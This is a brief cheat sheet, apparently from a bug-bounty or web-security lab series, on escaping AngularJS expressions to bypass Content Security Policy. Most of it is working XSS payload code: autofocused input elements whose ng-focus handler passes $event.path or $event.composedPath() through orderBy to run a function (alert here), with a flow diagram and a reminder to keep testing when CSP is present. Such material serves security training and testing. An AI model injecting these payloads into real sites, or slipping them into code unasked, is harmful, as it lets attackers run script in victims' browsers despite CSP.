# AngularJS CSP Bypass CheatSheet

## Problem

Traditional sandbox escapes fail because:

```text
Content Security Policy
```

blocks dangerous functions.

---

# Useful AngularJS Events

```html
ng-focus
ng-click
ng-mouseover
```

---

# Special Object

```javascript
$event
```

---

# Useful Property

```javascript
$event.path
```

---

Modern Alternative

```javascript
$event.composedPath()
```

---

# CSP Bypass Payload

```html
<input
autofocus
ng-focus=
"$event.path|orderBy:'[].constructor.from([1],alert)'">
```

---

# Modern Payload

```html
<input
autofocus
ng-focus=
"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
```

---

# Execution Flow

```text
Focus Event
        ↓
AngularJS Event
        ↓
$event.path
        ↓
orderBy
        ↓
Execution
```

---

# Related Lab

```text
Lab25
```

---

# Bug Bounty Reminder

If CSP exists:

```text
Do NOT Stop Testing
```

Look for:

```text
Angular Events
```

instead.